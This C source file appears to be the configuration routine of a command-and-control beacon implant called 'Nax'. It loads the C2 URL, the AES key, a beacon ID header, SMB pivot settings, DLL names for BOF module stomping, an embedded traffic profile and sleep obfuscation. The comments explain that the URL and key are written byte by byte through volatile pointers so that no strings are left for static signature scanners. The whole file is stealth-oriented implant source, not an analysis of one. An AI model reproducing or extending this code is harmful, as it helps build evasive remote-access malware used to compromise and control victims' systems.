/* beacon/src/Core/Config.c
 * NaxInitConfig - populate NAX_CONFIG from compile-time constants in Config.h.
 *
 * WHY NAX_C2_URL_WRITE / NAX_AES_KEY_WRITE macros: GCC -Os pools any local
 * char[]/byte[] initializer into .rdata and copies from there, even when the
 * source is { 'h','t','t','p',... } or { 0x48, 0xE9, ... }.  Direct indexed
 * assignments of integer constants through a volatile pointer always emit
 * immediate MOVs in .text with no .rdata entry.                               */

#include "Nax.h"
#include "Config.h"
#include "Transport.h"

FUNC VOID NaxInitConfig( PNAX_INSTANCE Nax ) {
    /* sleep / jitter - scalar assignments are always immediate MOVs */
    Nax->Config.SleepMs   = NAX_SLEEP_MS;
    Nax->Config.JitterPct = (BYTE)NAX_JITTER_PCT;

    /* AES key - per-byte immediate stores, no intermediate array */
    volatile BYTE *k = (volatile BYTE *)Nax->Config.AesKey;
    NAX_AES_KEY_WRITE( k );

    Nax->Config.DlChunkSize = NAX_DL_CHUNK_DEFAULT;

    /* listener watermark - used in SMB beat for pivot routing */
    Nax->Config.ListenerWm = NAX_LISTENER_WM;

    /* C2 URL - per-char immediate stores, no intermediate array */
    volatile CHAR *u = (volatile CHAR *)Nax->Config.C2Url;
    NAX_C2_URL_WRITE( u );

    /* Default beacon ID header - HTTP only (SMB uses raw pipe framing) */
#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
    volatile CHAR *bh = (volatile CHAR *)Nax->Config.BeaconIdHdr;
    bh[0]='X'; bh[1]='-'; bh[2]='B'; bh[3]='e'; bh[4]='a'; bh[5]='c';
    bh[6]='o'; bh[7]='n'; bh[8]='-'; bh[9]='I'; bh[10]='d'; bh[11]='\0';
#endif

    /* BOF module stomping config */
#if NAX_BOF_STOMP
    Nax->Config.BofStomp = 1;
    { volatile WCHAR *sd = (volatile WCHAR *)Nax->Config.BofSyncDll;
      NAX_BOF_SYNC_DLL_WRITE( sd ); }
    Nax->Config.BofAsyncCount = NAX_BOF_ASYNC_COUNT;
#if NAX_BOF_ASYNC_COUNT > 0
    { volatile WCHAR *ad = (volatile WCHAR *)Nax->Config.BofAsyncDlls[0];
      NAX_BOF_ASYNC_0_WRITE( ad ); }
#endif
#if NAX_BOF_ASYNC_COUNT > 1
    { volatile WCHAR *ad = (volatile WCHAR *)Nax->Config.BofAsyncDlls[1];
      NAX_BOF_ASYNC_1_WRITE( ad ); }
#endif
#if NAX_BOF_ASYNC_COUNT > 2
    { volatile WCHAR *ad = (volatile WCHAR *)Nax->Config.BofAsyncDlls[2];
      NAX_BOF_ASYNC_2_WRITE( ad ); }
#endif
#if NAX_BOF_ASYNC_COUNT > 3
    { volatile WCHAR *ad = (volatile WCHAR *)Nax->Config.BofAsyncDlls[3];
      NAX_BOF_ASYNC_3_WRITE( ad ); }
#endif
#ifdef NAX_SM_STOMP_DLL_WRITE
    { volatile WCHAR *sd = (volatile WCHAR *)Nax->Config.SmStompDll;
      NAX_SM_STOMP_DLL_WRITE( sd ); }
#endif
#endif

    /* Load embedded profile - HTTP only (SMB child uses raw pipe framing) */
#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
#ifdef NAX_PROFILE_LEN
    {
        PBYTE prof_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, NAX_PROFILE_LEN );
        if ( prof_buf ) {
            volatile BYTE *pp = (volatile BYTE *)prof_buf;
            NAX_PROFILE_WRITE( pp );
            NaxApplyProfile( Nax, prof_buf, NAX_PROFILE_LEN );
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, prof_buf );
        }
    }
#endif
#endif

    /* sleep obfuscation defaults (from Config.h, always recompiled by link target) */
#ifndef NAX_DEFAULT_SLEEP_OBF
#define NAX_DEFAULT_SLEEP_OBF 1
#endif
    Nax->SmInfo.Config.SleepObf = NAX_DEFAULT_SLEEP_OBF;
}

#if NAX_TRANSPORT_PROFILE != NAX_TRANSPORT_SMB
FUNC INT NaxApplyProfile( PNAX_INSTANCE Nax, const PBYTE body, UINT32 body_len ) {
    Nax->Config.ProfileLoaded = 0;
    return NaxDecodeProfile( body, body_len, Nax );
}
#endif
